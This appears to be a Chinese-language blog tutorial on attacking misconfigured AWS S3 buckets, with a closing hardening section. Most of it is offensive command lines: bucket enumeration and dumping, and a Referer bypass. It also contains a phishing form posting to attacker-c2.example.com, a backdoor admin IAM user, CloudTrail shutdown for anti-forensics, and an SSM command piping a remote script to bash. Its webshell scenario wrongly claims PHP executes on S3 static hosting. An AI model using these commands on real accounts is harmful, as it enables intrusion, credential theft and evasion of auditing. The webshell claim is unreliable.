---
title: 云安全：AWS S3存储桶安全
date: 2025-07-15 08:00:00
tags:
  - 云安全
  - 渗透测试
categories: 渗透测试
---

## 前言

Amazon S3（Simple Storage Service）是 AWS 最核心的存储服务之一，广泛应用于静态网站托管、日志存储、备份归档、大数据分析等场景。然而，由于配置不当、权限策略设计失误等原因，S3 存储桶数据泄露事件屡见不鲜——从 Verizon 到 Accenture，从美国国防承包商到医疗机构，因 S3 配置问题导致的敏感数据暴露层出不穷。

本文将从攻击者视角出发，系统性地梳理 S3 存储桶安全测试的核心技术和常见利用手法。

## 一、S3 存储桶基础概念

S3 存储桶的访问控制由两个层面组成：

1. **ACL（访问控制列表）**：传统权限模型，支持 `private`、`public-read`、`public-read-write`、`authenticated-read` 等预定义策略。
2. **Bucket Policy**：基于 JSON 的细粒度权限策略，使用 IAM 策略语言定义谁可以做什么操作。

安全风险往往出现在两者配合不当，或误将 `"Principal": "*"` 与 `"Action": "s3:*"` 组合使用时。

## 二、S3 存储桶公开枚举

### 2.1 通过 URL 直接访问

每个 S3 存储桶有两种标准访问端点：

```
https://<bucket-name>.s3.amazonaws.com
https://s3.amazonaws.com/<bucket-name>
```

当存储桶配置为公开读取时，访问上述 URL 会直接返回 XML 格式的对象列表。例如：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<ListBucketResult>
    <Name>example-bucket</Name>
    <Contents>
        <Key>backup/database.sql</Key>
        <Size>2048576</Size>
        <LastModified>2025-06-01T12:00:00.000Z</LastModified>
    </Contents>
    <Contents>
        <Key>credentials/aws_credentials.csv</Key>
        <Size>512</Size>
        <LastModified>2025-06-01T12:05:00.000Z</LastModified>
    </Contents>
</ListBucketResult>
```

### 2.2 使用 curl 探测

```bash
# 探测存储桶是否存在且可公开列举
curl -s https://example-bucket.s3.amazonaws.com | xmllint --format -

# 探测特定文件是否存在
curl -I https://example-bucket.s3.amazonaws.com/backup/database.sql
```

HTTP 状态码含义：
- `200`：文件存在且可公开访问
- `403`：文件存在但无访问权限
- `404`：文件不存在或存储桶本身不存在

### 2.3 DNS 解析信息收集

即使存储桶未公开列举，通过 DNS CNAME 记录仍可发现其存在：

```bash
dig example-bucket.s3.amazonaws.com
nslookup example-bucket.s3.amazonaws.com
```

## 三、AWS CLI 配置与使用

### 3.1 安装与配置

```bash
# 安装 AWS CLI v2
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip && sudo ./aws/install

# 配置凭证（需 Access Key ID 和 Secret Access Key）
aws configure
# AWS Access Key ID: AKIAXXXXXXXXXXXXXXX
# AWS Secret Access Key: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
# Default region name: us-east-1
# Default output format: json
```

### 3.2 无凭证探测

即使没有 AWS 凭证，仍可执行部分操作：

```bash
# 探测存储桶是否公开可读
aws s3 ls s3://example-bucket --no-sign-request

# 下载公开文件
aws s3 cp s3://example-bucket/secret.txt ./ --no-sign-request

# 同步整个公开存储桶
aws s3 sync s3://example-bucket ./dump/ --no-sign-request
```

`--no-sign-request` 参数允许在没有 AWS 凭证的情况下发送未签名请求，适用于公开可读的存储桶。

### 3.3 常见信息收集命令

```bash
# 查看存储桶策略
aws s3api get-bucket-policy --bucket example-bucket --no-sign-request

# 查看存储桶 ACL
aws s3api get-bucket-acl --bucket example-bucket --no-sign-request

# 查看存储桶网站配置
aws s3api get-bucket-website --bucket example-bucket --no-sign-request

# 查看存储桶版本控制状态
aws s3api get-bucket-versioning --bucket example-bucket --no-sign-request
```

## 四、S3 存储桶暴力枚举

### 4.1 基于关键词的存储桶名称猜测

S3 存储桶名称全局唯一，命名通常遵循一定规律：

- 公司名 + 环境：`acme-prod`、`acme-dev`、`acme-staging`
- 公司名 + 用途：`acme-backups`、`acme-logs`、`acme-static`
- 缩写组合：`acme-cdn`、`acme-assets`、`acme-data`

手工枚举示例：

```bash
# 常见名称前缀组合
for env in prod dev staging test; do
    for suffix in backups logs static assets media files data; do
        echo "[*] Trying: acme-${env}-${suffix}"
        curl -s -o /dev/null -w "%{http_code}" "https://acme-${env}-${suffix}.s3.amazonaws.com"
        echo ""
    done
done
```

### 4.2 使用自动化工具

**s3scanner**（Go 语言编写，速度快）：

```bash
# 安装
go install github.com/sa7mon/s3scanner@latest

# 扫描单个存储桶
s3scanner -bucket acme-prod

# 批量扫描
s3scanner -buckets-file bucket-list.txt -enumerate -out results.json
```

**AWSBucketDump**（Python 编写，适合快速验证）：

```bash
git clone https://github.com/jordanpotti/AWSBucketDump
cd AWSBucketDump
pip install -r requirements.txt

python AWSBucketDump.py -l bucket-list.txt -g interesting_ keywords.txt
```

### 4.3 基于 Web 存档的发现

利用证书透明度日志、搜索引擎缓存和 Web 存档发现历史 S3 端点：

```bash
# 通过 crt.sh 查询关联 S3 域名
curl -s "https://crt.sh/?q=%25s3.amazonaws.com&output=json" | jq -r '.[].name_value' | sort -u

# Google Dork 示例
# site:s3.amazonaws.com "公司名称"
# site:s3.amazonaws.com inurl:bucket
```

## 五、存储桶策略权限滥用

### 5.1 策略配置分析

一个典型的过度宽松策略：

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": [
                "s3:GetObject",
                "s3:PutObject",
                "s3:DeleteObject",
                "s3:ListBucket"
            ],
            "Resource": [
                "arn:aws:s3:::vulnerable-bucket",
                "arn:aws:s3:::vulnerable-bucket/*"
            ]
        }
    ]
}
```

上述策略允许任何人执行读、写、列举和删除操作，等同于将存储桶完全公开。

### 5.2 利用 s3:PutObject 写入权限

当存储桶允许公开 `s3:PutObject` 时，可上传任意文件：

```bash
# 上传文件到公开可写存储桶
aws s3 cp malware.html s3://vulnerable-bucket/index.html --no-sign-request

# 上传后通过 URL 直接访问
curl https://vulnerable-bucket.s3.amazonaws.com/malware.html
```

### 5.3 利用条件策略绕过

某些策略看似安全，但因条件语句存在逻辑漏洞：

```json
{
    "Effect": "Allow",
    "Principal": "*",
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::acme-cdn/*",
    "Condition": {
        "StringLike": {
            "aws:Referer": "*.acme.com"
        }
    }
}
```

绕过方式：

```bash
# 伪造 Referer 头即可绕过
curl -H "Referer: https://attacker-controlled.com.acme.com" \
     https://acme-cdn.s3.amazonaws.com/sensitive.doc -o leaked.doc

# 或直接使用空 Referer（某些实现存在缺陷）
curl -H "Referer:" https://acme-cdn.s3.amazonaws.com/sensitive.doc -o leaked.doc
```

## 六、静态网站托管钓鱼利用

### 6.1 识别托管为静态网站的存储桶

```bash
# 检查静态网站托管配置
aws s3api get-bucket-website --bucket target-bucket --no-sign-request

# 返回示例
{
    "IndexDocument": {"Suffix": "index.html"},
    "ErrorDocument": {"Key": "error.html"}
}
```

静态网站托管端点为：`http://<bucket-name>.s3-website-<region>.amazonaws.com`

### 6.2 钓鱼页面部署

当攻击者获得对存储桶的写入权限后，可利用静态网站托管功能部署钓鱼页面：

```html
<!-- 模拟企业登录页面 -->
<!DOCTYPE html>
<html>
<head>
    <title>Acme Corp - Sign In</title>
    <meta charset="utf-8">
</head>
<body>
    <div class="login-form">
        <form action="https://attacker-c2.example.com/collect" method="POST">
            <input type="text" name="username" placeholder="Username">
            <input type="password" name="password" placeholder="Password">
            <button type="submit">Sign In</button>
        </form>
    </div>
</body>
</html>
```

部署并启用静态网站托管：

```bash
# 上传钓鱼页面
aws s3 cp phishing-index.html s3://vulnerable-bucket/index.html --no-sign-request

# 启用静态网站托管（若有 PutBucketWebsite 权限）
aws s3api put-bucket-website \
    --bucket vulnerable-bucket \
    --website-configuration '{"IndexDocument":{"Suffix":"index.html"}}' \
    --no-sign-request
```

### 6.3 域名信誉利用

攻击者可利用存储桶的 S3 域名为钓鱼页面增加可信度——许多企业安全方案默认信任 `*.s3.amazonaws.com` 域名，且 AWS 的 SSL 证书链为合法 CA 签发，HTTPS 访问时浏览器不会报警。

## 七、CloudTrail 日志分析

### 7.1 CloudTrail 概述

CloudTrail 记录 AWS 账户中的 API 调用活动。对于 S3 存储桶，可通过 CloudTrail 审计以下事件：

- `GetObject`：文件下载记录
- `PutObject`：文件上传记录
- `DeleteObject`：文件删除记录
- `GetBucketPolicy`：策略读取记录
- `PutBucketPolicy`：策略修改记录

### 7.2 攻击前日志审查

```bash
# 列举 CloudTrail 追踪
aws cloudtrail describe-trails --region us-east-1

# 查看事件历史
aws cloudtrail lookup-events \
    --lookup-attributes AttributeKey=EventName,AttributeValue=GetObject \
    --max-results 50
```

### 7.3 日志清理与反取证

攻击者若获得足够权限，可能尝试关闭日志记录：

```bash
# 停止 CloudTrail 追踪
aws cloudtrail stop-logging --name my-trail

# 删除 CloudTrail 追踪
aws cloudtrail delete-trail --name my-trail

# 关闭 S3 服务器访问日志（需 s3:PutBucketLogging 权限）
aws s3api put-bucket-logging \
    --bucket target-bucket \
    --bucket-logging-status '{}'
```

**防御提示**：应启用 CloudTrail 日志文件完整性验证，并将日志存储于独立的专用审计账户中。

## 八、Access Key 泄露利用

### 8.1 Access Key 常见泄露途径

- **公开代码仓库**：开发者误将凭证硬编码并推送到 GitHub
- **前端 JavaScript**：SPA 应用在客户端代码中嵌入 AWS 凭证
- **配置文件泄露**：`.env`、`.aws/credentials` 等文件被公开访问
- **日志文件**：应用日志中记录了请求参数中的凭证信息

### 8.2 泄露凭证发现

```bash
# GitHub 搜索
# 关键词：AKIA 或 ASIA 开头的字符串 + secret
# site:github.com AKIA "aws_access_key"

# 针对已知存储桶中可能包含的凭证文件
curl -s https://vulnerable-bucket.s3.amazonaws.com/config/.env

# 批量搜索存储桶中的敏感文件
for file in .env .aws/credentials credentials.csv config.php wp-config.php; do
    curl -s -o /dev/null -w "%{http_code} - ${file}\n" \
        "https://vulnerable-bucket.s3.amazonaws.com/backup/${file}"
done
```

### 8.3 泄露凭证利用

```bash
# 配置泄露的凭证
aws configure set aws_access_key_id AKIAXXXXXXXXXXXXX
aws configure set aws_secret_access_key xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
aws configure set region us-east-1

# 验证凭证有效性
aws sts get-caller-identity

# 返回示例 — 凭证有效，已确认身份
# {
#     "UserId": "AIDAXXXXXXXXXXXXX",
#     "Account": "123456789012",
#     "Arn": "arn:aws:iam::123456789012:user/admin"
# }

# 枚举所有 S3 存储桶
aws s3 ls

# 列举 IAM 用户与角色
aws iam list-users
aws iam list-roles

# 检查当前权限边界
aws iam list-attached-user-policies --user-name admin
aws iam get-policy-version \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
    --version-id v1
```

### 8.4 权限提升

利用泄露凭证进行横向移动和权限提升：

```bash
# 创建新的高权限 IAM 用户作为后门
aws iam create-user --user-name support-bot
aws iam attach-user-policy \
    --user-name support-bot \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name support-bot

# 在 EC2 上执行命令（若有 SSM 权限）
aws ssm describe-instance-information
aws ssm send-command \
    --instance-ids i-xxxxxxxxxxxx \
    --document-name "AWS-RunShellScript" \
    --parameters '{"commands":["curl http://attacker-c2.example.com/shell.sh | bash"]}'
```

## 九、综合攻击场景

### 场景一：公开存储桶发现敏感备份

```bash
# 1. 通过子域名枚举发现 S3 端点
subfinder -d acme.com | grep s3

# 2. 探测存储桶权限
aws s3 ls s3://acme-backups --no-sign-request

# 3. 发现数据库备份文件
aws s3 cp s3://acme-backups/mysql-dump-2025-06-01.sql.gz ./ --no-sign-request

# 4. 提取凭证信息
zcat mysql-dump-2025-06-01.sql.gz | grep -i "password\|secret\|token"
```

### 场景二：利用策略配置漏洞上传 Webshell

```bash
# 1. 发现存储桶允许 PutObject 并配置了静态网站托管
aws s3api get-bucket-policy --bucket acme-static --no-sign-request
aws s3api get-bucket-website --bucket acme-static --no-sign-request

# 2. 上传 Webshell
aws s3 cp shell.php s3://acme-static/ --no-sign-request

# 3. 通过静态网站端点访问
curl http://acme-static.s3-website-us-east-1.amazonaws.com/shell.php?cmd=id
```

## 十、防御与加固建议

### 10.1 最小权限原则

- 禁止在 Bucket Policy 中使用 `"Principal": "*"` 与写权限的组合
- 使用 IAM 角色代替长期 Access Key
- 定期审计 IAM 用户及其权限

### 10.2 启用安全功能

```bash
# 阻止所有公开访问
aws s3api put-public-access-block \
    --bucket my-bucket \
    --public-access-block-configuration \
    "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"

# 启用默认加密
aws s3api put-bucket-encryption \
    --bucket my-bucket \
    --server-side-encryption-configuration \
    '{"Rules":[{"ApplyServerSideEncryptionByDefault":{"SSEAlgorithm":"AES256"}}]}'

# 启用版本控制防止数据被覆盖或删除
aws s3api put-bucket-versioning \
    --bucket my-bucket \
    --versioning-configuration Status=Enabled
```

### 10.3 持续监控

- 启用 CloudTrail 日志并转发至 SIEM
- 配置 S3 事件通知（对象创建/删除时触发告警）
- 使用 AWS Config 规则检测公开读写存储桶
- 使用 GuardDuty 检测异常 API 调用模式

## 十一、附录：常用工具清单

| 工具名称 | 用途 | 地址 |
|---------|------|-----|
| s3scanner | S3 存储桶扫描 | github.com/sa7mon/s3scanner |
| AWSBucketDump | 存储桶内容枚举 | github.com/jordanpotti/AWSBucketDump |
| cloud_enum | 云资源枚举 | github.com/initstring/cloud_enum |
| ScoutSuite | AWS 安全审计 | github.com/nccgroup/ScoutSuite |
| Prowler | AWS 安全评估 | github.com/prowler-cloud/prowler |

## 免责声明

本文所述技术仅供安全研究与授权测试使用。未经授权对他人系统进行测试、扫描或攻击属于违法行为。在实施任何安全测试之前，请确保已获得相关系统的书面授权。作者不对因滥用本文信息而导致的任何法律责任或损失负责。

> 安全从来不是产品，而是一个持续的过程。每一个公开的存储桶，每一次泄露的凭证，都是攻击者的入口。唯有持续学习、定期审计、纵深防御，方能在云上立于不败之地。
